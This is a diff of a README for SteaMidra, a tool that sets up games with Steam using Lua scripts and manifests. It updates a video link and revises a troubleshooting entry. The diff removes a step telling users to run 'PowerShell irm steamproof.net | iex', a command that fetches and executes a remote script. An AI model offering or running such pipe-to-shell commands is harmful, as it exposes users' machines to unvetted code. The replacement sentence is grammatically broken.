@@ -18,7 +18,7 @@ SteaMidra helps you set up games to work with Steam using Lua scripts, manifests
 
 **Need help?** Check the [documentation](docs/README.md) or reach out to me Merium0 on the Discord and we'll sort it out. Discord server: https://discord.gg/yp3UA6QdBC
 
-**Small video about SteaMidra:** https://youtu.be/HwAKjOGBfCc
+**Small video about SteaMidra:** [Youtube Tutorial](https://youtu.be/cFfItiV8-pk)
 
 ## Quick start
 
@@ -146,15 +146,9 @@ More details in [INSTALL_DEPENDENCIES.md](INSTALL_DEPENDENCIES.md).
 
 ## Troubleshooting
 
-**Steam says "No Internet Connection" when downloading** — This is a SteamTools issue where Steam can't reach the manifest endpoint. There are two ways to fix it:
+**Steam says "No Internet Connection" when downloading** — This is a with endpoints, which SteaMidra already has "fix" for it so it should not be an issue!
 
-1. **Quick permanent fix** — Run this in Win+R:
-   ```
-   PowerShell irm steamproof.net | iex
-   ```
-   Wait for it to finish. After this, Steam downloads will work normally. You can run it again to undo it.
-
-2. **SteaMidra handles it automatically** — When you process a .lua file or use "Update all manifests", manifests are written directly to Steam's `depotcache` folder before Steam starts. Steam finds them locally and never needs to contact the endpoint.
+1. **SteaMidra handles it automatically** — When you process a .lua file or use "Update all manifests", manifests are written directly to Steam's `depotcache` folder before Steam starts. Steam finds them locally and never needs to contact the endpoint.
 
 **Dependency conflicts / urllib3 error** — Run both install commands from Step 1 above (requirements.txt first, then `pip install steam==1.4.4 --no-deps`). If conflicts persist with other projects on your system, use a virtual environment.
 
